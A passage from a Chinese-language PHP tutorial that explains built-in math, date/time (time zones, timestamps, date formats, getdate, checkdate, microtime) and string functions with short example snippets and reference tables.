// 10</td><td align="left">浮点数</td><td align="left">进一取整</td></tr><tr><td align="center">floor()</td><td align="center">舍去法取整</td><td align="left">echo floor(9.999); // 9</td><td align="left">浮点数</td><td align="left">直接舍去小数部分</td></tr><tr><td align="center">fmod()</td><td align="center">浮点数取余</td><td align="left">“$x = 5.7;$y = 1.3;<br>$r = fmod($x, $y);<br>// $r equals 0.5, <br>because 4 *  1.3 + 0.5 = 5.7”</td><td align="left">两个浮点数,x&gt;y</td><td align="left">浮点余数</td></tr><tr><td align="center">pow()</td><td align="center">返回数的n次方</td><td align="left">echo pow(-1, 20); // 1</td><td align="left">基础数n次方</td><td align="left">乘方值</td></tr><tr><td align="center">round()</td><td align="center">浮点数四舍五入</td><td align="left">echo round(1.95583, 2);// 1.96</td><td align="left">一个数值</td><td align="left">保留小数点后多少位,默认为0,舍入后的结果</td></tr><tr><td align="center">sqrt()</td><td align="center">求平方根</td><td align="left">echo sqrt(9); //3</td><td align="left">被开方的数</td><td align="left">平方根</td></tr><tr><td align="center">max()</td><td align="center">求最大值</td><td align="left">“echo max(1, 3, 5, 6, 7);  <br>// 7 echo max(array(2, 4, 5)); <br>// 5”</td><td align="left">多个数字或数组</td><td align="left">返回其中的最大值</td></tr><tr><td align="center">min()</td><td align="center">求最小值</td><td align="left">min</td><td align="left">多个数字或数组</td><td align="left">返回其中的最小值</td></tr><tr><td align="center">mt_rand()</td><td align="center">更好的随机数</td><td align="left">echo mt_rand(0,9);//n</td><td align="left">最小/最大,随机数</td><td align="left">随机返回范围内的值</td></tr><tr><td align="center">rand()</td><td align="center">随机数</td><td align="left">echo rand()</td><td align="left">最小/最大,随机数</td><td align="left">随机返回范围内的值</td></tr><tr><td align="center">pi()</td><td align="center">获取圆周率值</td><td align="left">echo pi(); <br>// 3.1415926535898</td><td align="left">无</td><td align="left">获取圆周率</td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="2-4-获取时期时间信息函数"><font color="#3CB371" face="Comic sans MS">2.4  获取时期时间信息函数</font><a href="post/PHP-function#2-4-获取时期时间信息函数"></a></h4><p><font face="Comic sans MS">在正式学习日期函数前大家得了解几个概念：<br><font color="#00B2EE"><strong>1. 时区</strong><br><strong>2. 世界时</strong><br><strong>3 .unix时间戳</strong></font><br></font></p><blockquote><p><font color="#FF7F00"><strong>时区</strong></font><br>这个概念，之前大家听说过很多。我们来啰嗦两句，我们现实生活中使用的实区，在电脑里面也是一样有规定的。<br>1884年在华盛顿召开国际经度会议时，为了克服时间上的混乱，规定将全球划分为24个时区。<br>在中国采用首都北京所在地东八区的时间为全国统一使用时间。</p></blockquote><blockquote><p><font color="#FF7F00"><strong>世界时</strong></font><br>不光是天文学家使用格林尼治时间（英文简写:GMT），就是在新闻报刊上也经常出现这个名词。我们知道各地都有各地的地方时间。如果对国际上某一重大事情，用地方时间来记录，就会感到复杂不便．而且将来日子一长容易搞错。因此，天文学家就提出一个大家都能接受且又方便的记录方法，那就是以格林尼治（英国某地区）的地方时间为标准。</p></blockquote><blockquote><p><font color="#FF7F00"><strong>unix时间戳</strong></font><br>电脑本身不认识时间，我们在电脑里面设置一个时间方便运算。于是我们规定了一种计算方式，unix时间戳。<br>从Unix纪元（1970 年 1月1日零时）开始到一个时间经过的秒数。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. 设置时区</strong></font><br>如果，我们是跨国的多语方程序，我们通常是通过在配置文件里面来写好了个时区，每次程序运行的时候。都会读取这个时区的设置，来显示时间。</font></p><p>设置时区的函数为：<br>1). <font color="red"><strong>date_default_timezone_get()</strong></font><br>2). <font color="red"><strong>date_default_timezone_set()</strong></font><br></p><p>&emsp;<br><font color="#FF6347">(1)↓↓</font><br>第一个函数就不重点讲解了，比较简单。<br>用法如下：<br><font color="#00B2EE"><strong>string date_default_timezone_get ( void )</strong></font><br>功能如下：<strong>取得一个脚本中所有日期时间函数所使用的默认时区</strong><br>示例：<br><font color="#00B2EE"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">date_default_timezone_get</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>输出<span class="token punctuation">:</span><span class="token constant">UTC</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#FF6347">(2)↓↓</font><br>第二个函数是重点：<br>用法如下：<br><font color="#00B2EE"><strong>bool date_default_timezone_set ( string $timezone_identifier )</strong></font><br>功能如下：<strong>用于所有日期时间函数的默认时区</strong><font color="#00B2EE">&emsp;[注：<a href="http://php.net/manual/zh/timezones.php" target="_blank" rel="noopener">时区列表请详见官方手册</a>]</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//定义一下时区常量，以后你可以放到配置文件里define<span class="token punctuation">(</span><span class="token string">'TIME_ZONE'</span>,<span class="token string">'Asia/shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//执行函数date_default_timezone_set<span class="token punctuation">(</span>TIME_ZONE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> date<span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>输出：2019-02-17 13:03:42<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. time()获取当前的unix时间戳</strong></font><br>以下代码输出当前时间的Unix时间戳。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php   <span class="token variable">$time</span><span class="token operator">=</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   print_r<span class="token punctuation">(</span> <span class="token variable">$time</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>程序运行结果：1421597858<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. “亚麻跌”是PHP学习时间处理的关键</strong></font><br><font color="red"><strong>Y</strong></font> &emsp;英文是 year， 为年份   代表年 ——亚<br><font color="red"><strong>m</strong></font> &emsp;英文代表month，为月份  代表月 ——麻<br><font color="red"><strong>d</strong></font> &emsp;英文代表day， 为日期   代表日 ——跌<br><font color="red"><strong>H:i:s</strong></font> &emsp;代表的是：时分秒<br><font color="red"><strong>h</strong></font> &emsp;的英文为：hour 代表小时<br><font color="red"><strong>i</strong></font>&emsp; 的英文为：minute 代表分钟<br><font color="red"><strong>s</strong></font>&emsp; 的英文为：second 代表秒<br></font></p><p>所以我们需要输出前前的年份，月份，日期的话。例如：1997年7月1日，我们就可以用到上面的三个参数。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token keyword">echo</span> date<span class="token punctuation">(</span><span class="token string">'Y年m月d日'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>2019年02月17日<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>写全了就是：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//就可以显示出来当前的时间了哟。<span class="token keyword">echo</span> date<span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>date函数</strong></font>用于将一个时间进行格式化输出，以方便时间的显示或存储。其语法格式如下：<br><font color="#00B2EE"><strong>string date ( string $forrnat [, int $timestamp] )</strong></font><br>在参数列表中:<br>$timestamp是一个时间戳，函数将这个时间戳按$format规定的格式输出。<br>如果$timestamp没有输入值，则默认为当前的时间。<br>$format是一个时间输出格式的字符串，需要使用规定的字符构造输出格式。<br></font></p><p>&emsp;<br><font color="#FF7F00"><strong>date函数的格式参数表：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">字符</th><th align="left">说明</th><th align="left">返回值</th></tr></thead><tbody><tr><td align="center">d</td><td align="left">月份中的第几天，有前导零的2位数字</td><td align="left">01到31</td></tr><tr><td align="center">D</td><td align="left">英文星期几，3个字母</td><td align="left">Mon到Sun</td></tr><tr><td align="center">j</td><td align="left">月份中的第几天，没有前导零</td><td align="left">1到31</td></tr><tr><td align="center">l(字母)</td><td align="left">英文星期几</td><td align="left">Sunday到 Saturday</td></tr><tr><td align="center">N</td><td align="left">1格式数字表示的星期</td><td align="left">1（表示星期一）到7（表示星期天)</td></tr><tr><td align="center">S</td><td align="left">每月天数后面的英文后缀，2个字符</td><td align="left">st，nd，rd或者th。可以和jg一起用</td></tr><tr><td align="center">w</td><td align="left">星期中的第几天，数字表示</td><td align="left">0（表示星期天）到 6（表示星期六）</td></tr><tr><td align="center">z</td><td align="left">一年中的第几天</td><td align="left">0到366</td></tr><tr><td align="center">W</td><td align="left">年份中的第几周，每周从星期一开始</td><td align="left">42（当年的第42周）</td></tr><tr><td align="center">F</td><td align="left">月份，完整的文本格式</td><td align="left">January 到 December</td></tr><tr><td align="center">m</td><td align="left">数字表示月份，有前导零</td><td align="left">01 到 12</td></tr><tr><td align="center">M</td><td align="left">3个字母缩写表示的月份</td><td align="left">Jan 到Dec</td></tr><tr><td align="center">n</td><td align="left">数字表示月份，没有前导零</td><td align="left">1 到 12</td></tr><tr><td align="center">t</td><td align="left">给定月份所应有的天数</td><td align="left">28 到 31</td></tr><tr><td align="center">L</td><td align="left">是否为闰年</td><td align="left">如果是闰年为1，否则为o</td></tr><tr><td align="center">o</td><td align="left">格式年份数字</td><td align="left">例如2007</td></tr><tr><td align="center">Y</td><td align="left">4 位数字完整表示年份</td><td align="left">例如1999或2008</td></tr><tr><td align="center">y</td><td align="left">2 位数字表示的年份</td><td align="left">例如99或08</td></tr><tr><td align="center">a</td><td align="left">小写的上午和下午值</td><td align="left">am或pm</td></tr><tr><td align="center">A</td><td align="left">大写的上午和下午值</td><td align="left">AM或PM</td></tr><tr><td align="center">g</td><td align="left">小时，12小时格式，没有前导零</td><td align="left">1到12</td></tr><tr><td align="center">G</td><td align="left">小时，24小时格式，没有前导零</td><td align="left">0 到 23</td></tr><tr><td align="center">i</td><td align="left">有前导零的分钟数</td><td align="left">00 到 59</td></tr><tr><td align="center">s</td><td align="left">秒数，有前导零</td><td align="left">00到59</td></tr><tr><td align="center">e</td><td align="left">时区标识</td><td align="left"></td></tr><tr><td align="center">U</td><td align="left">从Unix纪元开始至今的秒数</td><td align="left">长整型数字</td></tr></tbody></table></div></div><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. getdate获取当前系统时间</strong></font><br><font color="red"><strong>getdate</strong></font>用来获取当前系统的时间，或者获得一个时间戳的具体含义。时间戳是一个长整数，表示getdate的语法格式如下所示。<br><font color="red"><strong>array getdate ([ int $timestamp = time() ] )</strong></font><br>函数的返回值是一个根据timestamp得到的包含有时间信息的<strong>数组</strong>。如果没有参数，则会返回当前的时间。getdate返回的数组，键名包括时间和日期的完整信息。<br></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">键名</th><th align="left">说明</th><th align="left">返回值</th></tr></thead><tbody><tr><td align="center">secnods</td><td align="left">秒</td><td align="left">数字0到 59</td></tr><tr><td align="center">minutes</td><td align="left">分钟</td><td align="left">数字0到59</td></tr><tr><td align="center">hours</td><td align="left">小时</td><td align="left">数字 0到 23</td></tr><tr><td align="center">mday</td><td align="left">月份中第几天    数字</td><td align="left">1到 31</td></tr><tr><td align="center">wday</td><td align="left">星期中第几天    数字</td><td align="left">0（表示星期天）到6（表示星期六）</td></tr><tr><td align="center">mon</td><td align="left">月份</td><td align="left">数字 1 到 12</td></tr><tr><td align="center">year</td><td align="left">年</td><td align="left">4 位数字表示的完整年份</td></tr><tr><td align="center">yday</td><td align="left">一年中第几天    数字</td><td align="left">0到365</td></tr><tr><td align="center">weekday</td><td align="left">星期几的英文</td><td align="left">Sunday到 Saturday</td></tr><tr><td align="center">month</td><td align="left">月份的英文</td><td align="left">January 到 December</td></tr><tr><td align="center">0</td><td align="left">自从Unix纪元开始的秒数</td><td align="left">长整型数字</td></tr></tbody></table></div></div><p>&emsp;<br>以下代码可以返回getdate 数组的详细信息。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$mytime</span><span class="token operator">=</span><span class="token function">getdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span> <span class="token variable">$mytime</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><strong>print_r</strong>可以输出一个数组中所有的键名与值。运行这段代码，结果如下所示。程序输出当前计算机的时间与日期详细信息：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">Array</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span>seconds<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>            <span class="token comment" spellcheck="true">//秒</span>    <span class="token punctuation">[</span>minutes<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10</span>            <span class="token comment" spellcheck="true">//分钟</span>    <span class="token punctuation">[</span>hours<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">17</span>            <span class="token comment" spellcheck="true">//小时</span>    <span class="token punctuation">[</span>mday<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">18</span>            <span class="token comment" spellcheck="true">//日</span>    <span class="token punctuation">[</span>wday<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span>            <span class="token comment" spellcheck="true">//星期中的第几天</span>    <span class="token punctuation">[</span>mon<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>            <span class="token comment" spellcheck="true">//月</span>    <span class="token punctuation">[</span>year<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">2015</span>            <span class="token comment" spellcheck="true">//年</span>    <span class="token punctuation">[</span>yday<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">17</span>            <span class="token comment" spellcheck="true">//年中的第几天</span>    <span class="token punctuation">[</span>weekday<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> Sunday        <span class="token comment" spellcheck="true">//星期</span>    <span class="token punctuation">[</span>month<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> January        <span class="token comment" spellcheck="true">//月份</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1421597401</span>        <span class="token comment" spellcheck="true">//时间戳</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#FF6347">↓↓</font>理解了getdate函数和返回的数组以后，就很容易取得当前的时间信息了。下面的代码就是用getdate函数取得时间信息，调用返回时间数组的值输出时间信息。<br><font color="#00B2EE"></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php <span class="token variable">$mytime</span> <span class="token operator">=</span> getdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"年 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'year'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"月 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'mon'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"日 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'mday'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"时 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'hours'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"分 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'minutes'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"秒 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'seconds'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"一个小时中的第几钟 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'minutes'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"这是一分钟的第几秒 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'seconds'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"星期名称 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'weekday'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"月份名称 :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span><span class="token string">'month'</span><span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"时间戳   :"</span><span class="token keyword">.</span><span class="token variable">$mytime</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span>.<span class="token string">"\n"</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行结果：年 :2019 月 :2 日 :17 时 :5 分 :39 秒 :34 一个小时中的第几钟 :39 这是一分钟的第几秒 :34 星期名称 :Sunday 月份名称 :February 时间戳 :1550381974<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. 日期验证函数</strong></font><br><font color="red"><strong>checkdate</strong></font>可以判断一个输出的日期是否有效。<br>在实际的工作中，我们需要经常用于检测常用于用户提交表单的数据验证。<br>例如：<strong>验证用户输入的时间是否正确</strong>。<br>函数的语法格式如下：<br><font color="red"><strong>bool checkdate ( int $month , int $day , int $year )</strong></font><br></font><br>&emsp;<br><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">checkdate</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">2018</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">checkdate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">2011</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>输出结果：<span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6.获取本地化时间戳函数</strong></font> </font><br><strong>mktime()函数、strtotime()函数。</strong><br><font color="#00B2EE">[注：<a href="http://www.php.cn/code/1116.html" target="_blank" rel="noopener">使用方法</a>]</font></p><p>&emsp;<br>&emsp;</p><h4 id="2-5-检测程序执行时间"><font color="#3CB371" face="Comic sans MS">2.5  检测程序执行时间</font><a href="post/PHP-function#2-5-检测程序执行时间"></a></h4><p><font face="Comic sans MS">我们有的时经常需要做程序的执行时间执行效率判断。</font><br>实现的思路如下：<br><font color="red"></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//记录开始时间//记录结整时// 开始时间  减去（-）  结束时间  得到程序的运行时间?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br><font face="Comic sans MS">可是不要忘了，程序的运行速度太快了。快到只有0.00000几秒的一刹那。那这个时候大家要记录一个特函的函数了：</font><br><font color="red"><strong>mixed microtime ([ bool $get_as_float ] )</strong></font><br><strong>microtime()这个函数，能够返回当前 Unix 时间戳和微秒数。</strong><br><font color="red"></font></p><blockquote><p><font color="#FF6347"><strong>参数：</strong><br>如果你传入true的话，将会返回一个浮点类型的时间，这样方便参与运算。</font></p></blockquote><p>模拟一个检测函数执行时间的例子，测试某个函数效率的快慢：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//开始时间<span class="token variable">$time_start</span> <span class="token operator">=</span> microtime<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>//循环一万次for<span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> 0 <span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> 10000 <span class="token punctuation">;</span> <span class="token variable">$i</span>++<span class="token punctuation">)</span><span class="token punctuation">{</span>   //你可以用上，mktime<span class="token punctuation">(</span><span class="token punctuation">)</span> 生成一个昨天的时间   //再用strtotime<span class="token punctuation">(</span><span class="token punctuation">)</span> 生成一个昨天的时间   //对比两个函数认的效率高<span class="token punctuation">}</span>//结整时间<span class="token variable">$time_end</span> <span class="token operator">=</span> microtime<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>//相减得到运行时间<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token variable">$time_end</span> - <span class="token variable">$time_start</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"这个脚本执行的时间为 <span class="token variable">$time</span> seconds\n"</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行结果：这个脚本执行的时间为 0.00016498565673828 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>最后输出的结果就是我们实际的函数的执行时间。你可以多对比几次，看看最终的结果。<br>谁的时间短，在实际的工作中，你就可以经常使用哪个函数。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="2-6-字符串常用函数"><font color="#3CB371" face="Comic sans MS">2.6  字符串常用函数</font><a href="post/PHP-function#2-6-字符串常用函数"></a></h4><p><font color="red"><strong>数组</strong></font>、<font color="red"><strong>字符串</strong></font>和<font color="red"><strong>数据库</strong></font>是我们函数里面最、最、最常用的三类函数。</p><p><font face="Comic sans MS">当然PHP的字符串函数也有很多。我们最常使用的两个系列的字符串：<br>    1.单字节字符串处理函数<br>    2.多字节字符串处理函数<br>    3.字符串编码转换函数<br></font></p><blockquote><p><font color="#FF6347"><strong>我们来说说为什么要学这么多函数：</strong></font><br>    1.我们学的是中文，是双字节或者三字节的。老外的函数只能处理英文和数字这些单字节的字符串处理不鸟中文。达不到我们的功能需求<br>    2.有的时候需要做不同字符编码间的转换，例如：把GBK的转为UTF-8<br>    3.英文这些字符在电脑里又是必须要处理的</p></blockquote><p>&emsp;</p><blockquote><p>中文主要用的是GBK和utf-8两种编码格式。<br>GBK和utf-8是两个不同的编码委员会对于汉字进行的编码的标准。<br>他们规定GBK是双字节，也就是一个汉字占用2Bytes。<br>utf-8是三字节，一个汉字占用三个字节长度的存储空间。</p></blockquote><p>&emsp;<br><font color="#00B2EE">PHP常用函数：</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="center">trim()</td><td align="left">删除字符串两端的空格或其他预定义字符</td><td align="left">“$str = “\r\nHello World!\r\n”; echo trim($str);</td></tr><tr><td align="center">rtrim()</td><td align="left">删除字符串右边的空格或其他预定义字符</td><td align="left">“$str = “Hello World!\n\n”; echo rtrim($str);”</td></tr><tr><td align="center">chop()</td><td align="left">rtrim()的别名</td><td align="left">同上</td></tr><tr><td align="center">ltrim()</td><td align="left">删除字符串左边的空格或其他预定义字符</td><td align="left">“$str = “\r\nHello World!”; echo ltrim($str);”</td></tr><tr><td align="center">dirname()</td><td align="left">回路径中的目录部分（我们把它归在了字符串函数里了）</td><td align="left">echo dirname(“c:/testweb/home.php”);</td></tr><tr><td align="center">str_pad()</td><td align="left">把字符串填充为指定的长度</td><td align="left">$str = “Hello World”; echo str_pad($str,20,”.”);</td></tr><tr><td align="center">str_repeat()</td><td align="left">重复使用指定字符串</td><td align="left">echo str_repeat(“.”,13);</td></tr><tr><td align="center">str_split()</td><td align="left">把字符串分割到数组中</td><td align="left">print_r(str_split(“Hello”));</td></tr><tr><td align="center">strrev()</td><td align="left">反转字符串</td><td align="left">echo strrev(“Hello World!”);</td></tr><tr><td align="center">wordwrap()</td><td align="left">按照指定长度对字符串进行折行处理</td><td align="left">“$str = “”An example on a long word is: Supercalifragulistic””; echo wordwrap($str,15);”</td></tr><tr><td align="center">str_shuffle()</td><td align="left">随机地打乱字符串中所有字符</td><td align="left">echo str_shuffle(“Hello World”);</td></tr><tr><td align="center">parse_str()</td><td align="left">将字符串解析成变量</td><td align="left">“parse_str(“id=23&amp;name=John%20Adams”,$myArray); print_r($myArray);”</td></tr><tr><td align="center">number_format()</td><td align="left">通过千位分组来格式化数字</td><td align="left">“echo number_format(“1000000”); echo number_format(“1000000”,2); echo number_format(“1000000”,2,””,””,””.””);”</td></tr><tr><td align="center">strtolower()</td><td align="left">字符串转为小写</td><td align="left">echo strtolower(“Hello WORLD!”);</td></tr><tr><td align="center">strtoupper()</td><td align="left">字符串转为大写</td><td align="left">echo strtoupper(“Hello WORLD!”);</td></tr><tr><td align="center">ucfirst()</td><td align="left">字符串首字母大写</td><td align="left">echo ucfirst(“hello world”);</td></tr><tr><td align="center">ucwords()</td><td align="left">字符串每个单词首字符转为大写</td><td align="left">echo ucwords(“hello world”);</td></tr><tr><td align="center">htmlentities()</td><td align="left">把字符转为HTML实体</td><td align="left">$str = “”John &amp; ‘Adams’””; echo htmlentities($str, ENT_COMPAT);</td></tr><tr><td align="center">htmlspecialchars()</td><td align="left">预定义字符转html编码</td><td align="left"></td></tr><tr><td align="center">nl2br()</td><td align="left">\n转义为标签</td><td align="left">echo nl2br(“One line.\nAnother line.”);</td></tr><tr><td align="center">strip_tags()</td><td align="left">剥去 HTML、XML 以及 PHP 的标签</td><td align="left">echo strip_tags(“Hello world!”);</td></tr><tr><td align="center">addcslashes()</td><td align="left">在指定的字符前添加反斜线转义字符串中字符</td><td align="left">$str = “”Hello, my name is John Adams.” echo $str; echo addcslashes($str,’m’);”</td></tr><tr><td align="center">stripcslashes()</td><td align="left">删除由addcslashes()添加的反斜线</td><td align="left">echo stripcslashes(“Hello, \my na\me is Kai Ji\m.”);</td></tr><tr><td align="center">addslashes()</td><td align="left">指定预定义字符前添加反斜线</td><td align="left">$str = “Who’s John Adams?”;echo addslashes($str);</td></tr><tr><td align="center">stripslashes()</td><td align="left">删除由addslashes()添加的转义字符</td><td align="left">echo stripslashes(“Who&#39;s John Adams?”);</td></tr><tr><td align="center">quotemeta()</td><td align="left">在字符串中某些预定义的字符前添加反斜线</td><td align="left">$str = “Hello world. (can you hear me?)”; echo quotemeta($str);</td></tr><tr><td align="center">chr()</td><td align="left">从指定的 ASCII 值返回字符</td><td align="left">echo chr(052);</td></tr><tr><td align="center">ord()</td><td align="left">返回字符串第一个字符的 ASCII值</td><td align="left">echo ord(“hello”);</td></tr><tr><td align="center">strcasecmp()</td><td align="left">不区分大小写比较两字符串</td><td align="left">echo strcasecmp(“Hello world!”,”HELLO WORLD!”);</td></tr><tr><td align="center">strcmp()</td><td align="left">区分大小写比较两字符串</td><td align="left"></td></tr><tr><td align="center">strncmp()</td><td align="left">比较字符串前n个字符,区分大小写</td><td align="left"></td></tr><tr><td align="center">strncasecmp()</td><td align="left">比较字符串前n个字符,不区分大小写</td><td align="left">int strncasecmp ( string $str1 , string $str2 , int $len )</td></tr><tr><td align="center">strnatcmp()</td><td align="left">自然顺序法比较字符串长度,区分大小写</td><td align="left">int strnatcmp ( string $str1 , string $str2 )</td></tr><tr><td 